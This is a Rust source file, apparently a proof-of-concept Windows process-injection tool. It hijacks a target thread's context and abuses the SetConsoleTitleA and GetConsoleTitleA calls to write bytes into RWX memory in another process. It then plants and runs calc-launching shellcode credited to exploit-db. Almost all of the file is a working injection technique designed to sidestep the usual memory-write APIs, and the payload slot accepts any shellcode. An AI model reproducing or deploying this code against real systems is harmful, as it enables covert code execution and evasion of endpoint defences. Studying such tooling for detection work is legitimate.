#![allow(non_snake_case, clippy::manual_c_str_literals, clippy::manual_strip)]

/*----------[IMPORTS]----------*/
use winapi::um::{
    processthreadsapi::{OpenProcess, OpenThread, SuspendThread, GetThreadContext, SetThreadContext, ResumeThread},
    wincon::{SetConsoleTitleA, AttachConsole, FreeConsole},
    memoryapi::VirtualAllocEx,
    handleapi::CloseHandle,
    libloaderapi::{GetModuleHandleA, GetProcAddress},
    errhandlingapi::GetLastError,
    synchapi::Sleep,
};

use winapi::shared::{
    minwindef::{BYTE, DWORD, LPVOID, LPBYTE, FALSE},
    ntdef::HANDLE,
    basetsd::{SIZE_T, ULONG_PTR}
};

use winapi::um::winnt::{CONTEXT, PROCESS_VM_OPERATION, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, THREAD_SUSPEND_RESUME, THREAD_GET_CONTEXT, THREAD_SET_CONTEXT, CONTEXT_ALL};

use std::mem::{size_of as sizeof, zeroed};
use std::ptr::{null_mut as null};
use std::process::exit;

/*----------[MACROS]----------*/
macro_rules! OKAY {($($arg:tt)*) => {println!("[+] {}", format_args!($($arg)*))};}
macro_rules! INFO {($($arg:tt)*) => {println!("[!] {}", format_args!($($arg)*))};}
macro_rules! WARN {($($arg:tt)*) => {println!("[-] {}", format_args!($($arg)*))};}
macro_rules! CTXT {
    ($ctx:expr) => {
        println!("\n[ ------- REGISTERS ------- ]");
        println!(" | RSP - 0x{:016x}", $ctx.Rsp);
        println!(" | RIP - 0x{:016x}", $ctx.Rip);
        println!(" | RCX - 0x{:016x}", $ctx.Rcx);
        println!(" | RDX - 0x{:016x}", $ctx.Rdx);
        println!("[ ------------------------- ]\n");
    };
}

macro_rules! EROR {
    ($func_name:expr, $err:expr) => {
        eprintln!("[-] [{}] Failed, error: {} (0x{:08x})", 
            $func_name, 
            $err,
            $err
        );
    };
}

/*----------[HELPERS]----------*/
fn hexParser(s: &str) -> Result<u64, std::num::ParseIntError> {
    if s.starts_with("0x") {
        u64::from_str_radix(&s[2..], 16)
    } else {
        u64::from_str_radix(s, 16)
    }
}

/*----------[WRITE TO MEMORY FUNCTION]----------*/
fn MirrorGate(hThread: HANDLE, Rip: LPVOID, RetAddr: LPVOID, DestAddr: LPVOID, SrcBuff: LPBYTE , BufSize: SIZE_T) -> Result<(), ()> {
    unsafe {
        if SuspendThread(hThread) == u32::MAX {
            EROR!("SuspendThread", GetLastError());
            exit(1)
        }

        let mut ctx: CONTEXT = zeroed();
        ctx.ContextFlags = CONTEXT_ALL;
    
        if GetThreadContext(hThread, &mut ctx) == 0 {
            let err = GetLastError();
            EROR!("GetThreadContext", err);
            exit(1)
        }

        ctx.Rsp = RetAddr as u64;
        ctx.Rip = Rip as u64;
        ctx.Rcx = DestAddr as u64;
        ctx.Rdx = BufSize as u64;

        OKAY!("Thread suspended successfully..");
        CTXT!(ctx);

        if SetThreadContext(hThread, &ctx) == 0 {
            EROR!("SetThreadContext", GetLastError());
            exit(1)
        }

        if SetConsoleTitleA(SrcBuff as *const i8) == 0 {
            EROR!("SetConsoleTitleA", GetLastError());
            exit(1)
        }

        if ResumeThread(hThread) == u32::MAX {
            EROR!("ResumeThread", GetLastError()); 
            exit(1)
        }

        Sleep(250);
    }
    Ok(())
}

fn main() {
    let args: Vec<String> = std::env::args().collect();
    if args.len() < 4 {
        INFO!("Usage: {} <PID> <TID> 0x[loopaddr]", args[0]);
        exit(1);
    }

    let pid = args[1].parse::<DWORD>().unwrap_or_else(|_| {
        println!("Invalid PID");
        exit(1);
    });

    let tid = args[2].parse::<DWORD>().unwrap_or_else(|_| {
        println!("Invalid TID");
        exit(1);
    });

    let loop_addr = match hexParser(&args[3]) {
        Ok(addr) => {
            if addr == 0 {
                WARN!("The address must valid");
                exit(1)
            }
            addr
        },
        Err(_) => {
            WARN!("Invalid address format");
            exit(1);
        }
    };

    unsafe {
        let hProcess = OpenProcess(PROCESS_VM_OPERATION, 0, pid);
        if hProcess.is_null() {
            EROR!("OpenProcess", GetLastError());
            exit(1)
        }

        let size: SIZE_T = 1 << 20;
        let buffer = VirtualAllocEx(hProcess, null(), size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if buffer.is_null() {
            EROR!("VirtualAllocEx", GetLastError());
            exit(1)
        }

        CloseHandle(hProcess);
        OKAY!("Allocated RWX 0x{:x} bytes at 0x{:02x}", size, buffer as usize);

        let hThread:HANDLE = OpenThread(THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT, FALSE, tid);
        if hThread.is_null() {
            EROR!("OpenThread", GetLastError());
            exit(1)
        }

        let hKernelBase = GetModuleHandleA(b"kernelbase.dll\0".as_ptr() as *const i8);
        if hKernelBase.is_null() {
            EROR!("GetModuleHandleA", GetLastError());
            exit(1)
        }

        let fGetConsoleTitleA: LPVOID = GetProcAddress(hKernelBase, b"GetConsoleTitleA\0".as_ptr() as *const i8) as LPVOID;
        if fGetConsoleTitleA.is_null() {
            EROR!("GetProcAddress", GetLastError());
            exit(1)
        }

        OKAY!("GetConsoleTitleA at 0x{:02x}", fGetConsoleTitleA as usize);

        if FreeConsole() == 0 {
            EROR!("FreeConsole", GetLastError()); 
            exit(1)
        }

        if AttachConsole(pid) == 0 {
            EROR!("AttachConsole", GetLastError());    
            exit(1)
        }


        if MirrorGate(hThread, fGetConsoleTitleA,                                     
            (buffer as ULONG_PTR + 0x7000) as LPVOID,
            (buffer as ULONG_PTR + 0x7000) as LPVOID,
            &loop_addr as *const _ as LPBYTE,
            sizeof::<ULONG_PTR>()                      
        ).is_err() { 
            EROR!("Injector[JMPloop]", GetLastError());
            exit(1)
        }

        let pPayload = (buffer as ULONG_PTR + 0x7020) as LPVOID;
        if MirrorGate(
            hThread,
            fGetConsoleTitleA,                                  
            (buffer as ULONG_PTR + 0x7000) as LPVOID,
            (buffer as ULONG_PTR + 0x7010) as LPVOID,
            &(pPayload as ULONG_PTR) as *const _ as LPBYTE,
            sizeof::<ULONG_PTR>()                      
        ).is_err() {
            EROR!("Injector[Payload Pointer]", GetLastError());
            exit(1)
        }
        
        /* PopCalc shellcode source: https://www.exploit-db.com/shellcodes/49819 */
        let mut PAYLOAD: [BYTE; 205] = [
            0x48, 0x31, 0xff, 0x48, 0xf7, 0xe7, 0x65, 0x48, 0x8b, 0x58, 0x60, 0x48, 0x8b, 0x5b, 0x18, 0x48,
            0x8b, 0x5b, 0x20, 0x48, 0x8b, 0x1b, 0x48, 0x8b, 0x1b, 0x48, 0x8b, 0x5b, 0x20, 0x49, 0x89, 0xd8,
            0x8b, 0x5b, 0x3c, 0x4c, 0x01, 0xc3, 0x48, 0x31, 0xc9, 0x66, 0x81, 0xc1, 0xff, 0x88, 0x48, 0xc1,
            0xe9, 0x08, 0x8b, 0x14, 0x0b, 0x4c, 0x01, 0xc2, 0x4d, 0x31, 0xd2, 0x44, 0x8b, 0x52, 0x1c, 0x4d,
            0x01, 0xc2, 0x4d, 0x31, 0xdb, 0x44, 0x8b, 0x5a, 0x20, 0x4d, 0x01, 0xc3, 0x4d, 0x31, 0xe4, 0x44,
            0x8b, 0x62, 0x24, 0x4d, 0x01, 0xc4, 0xeb, 0x32, 0x5b, 0x59, 0x48, 0x31, 0xc0, 0x48, 0x89, 0xe2,
            0x51, 0x48, 0x8b, 0x0c, 0x24, 0x48, 0x31, 0xff, 0x41, 0x8b, 0x3c, 0x83, 0x4c, 0x01, 0xc7, 0x48,
            0x89, 0xd6, 0xf3, 0xa6, 0x74, 0x05, 0x48, 0xff, 0xc0, 0xeb, 0xe6, 0x59, 0x66, 0x41, 0x8b, 0x04,
            0x44, 0x41, 0x8b, 0x04, 0x82, 0x4c, 0x01, 0xc0, 0x53, 0xc3, 0x48, 0x31, 0xc9, 0x80, 0xc1, 0x07,
            0x48, 0xb8, 0x0f, 0xa8, 0x96, 0x91, 0xba, 0x87, 0x9a, 0x9c, 0x48, 0xf7, 0xd0, 0x48, 0xc1, 0xe8,
            0x08, 0x50, 0x51, 0xe8, 0xb0, 0xff, 0xff, 0xff, 0x49, 0x89, 0xc6, 0x48, 0x31, 0xc9, 0x48, 0xf7,
            0xe1, 0x50, 0x48, 0xb8, 0x9c, 0x9e, 0x93, 0x9c, 0xd1, 0x9a, 0x87, 0x9a, 0x48, 0xf7, 0xd0, 0x50,
            0x48, 0x89, 0xe1, 0x48, 0xff, 0xc2, 0x48, 0x83, 0xec, 0x20, 0x41, 0xff, 0xd6
        ];

        if MirrorGate(
            hThread,
            fGetConsoleTitleA,                                  
            (buffer as ULONG_PTR + 0x7010) as LPVOID,
            (buffer as ULONG_PTR + 0x7020) as LPVOID,
            PAYLOAD.as_mut_ptr(),        
            PAYLOAD.len()                              
        ).is_err() {
            EROR!("Injector[Payload]", GetLastError());
            exit(1)
        }

        CloseHandle(hThread);
        OKAY!("Injection was successfully!");
    }
}
